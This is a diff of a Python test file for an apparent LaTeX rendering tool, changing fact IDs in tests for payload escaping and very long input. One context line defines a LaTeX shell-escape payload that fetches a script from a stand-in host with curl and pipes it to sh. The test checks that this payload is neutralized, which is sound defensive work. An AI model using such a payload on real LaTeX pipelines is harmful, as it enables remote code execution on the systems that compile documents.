@@ -9,7 +9,7 @@ SHELL_ESCAPE_PAYLOAD = r"\immediate\write18{curl http://evil.example/pwn | sh}"
 
 
 def test_shell_escape_payload_is_neutralized_by_escaping(master):
-    master.experiences[0].facts[0] = Fact(id="f1", text=SHELL_ESCAPE_PAYLOAD)
+    master.experiences[0].facts[0] = Fact(id="BAB-01", text=SHELL_ESCAPE_PAYLOAD)
     tex = render_tex(master, None)
     assert r"\write18" not in tex.replace(r"\textbackslash{}write18", "")
     assert r"\textbackslash{}immediate\textbackslash{}write18" in tex
@@ -43,7 +43,7 @@ def test_infinite_loop_hits_timeout(tmp_path):
 
 
 def test_absurdly_long_fact(master, tmp_path):
-    master.experiences[0].facts[0] = Fact(id="f1", text="A" * 200_000)
+    master.experiences[0].facts[0] = Fact(id="BAB-01", text="A" * 200_000)
     tex = render_tex(master, None)
     pdf_path, log = compile_tex(tex, output_dir=tmp_path, timeout_s=30)
     # must terminate cleanly either way: a PDF or a surfaced error
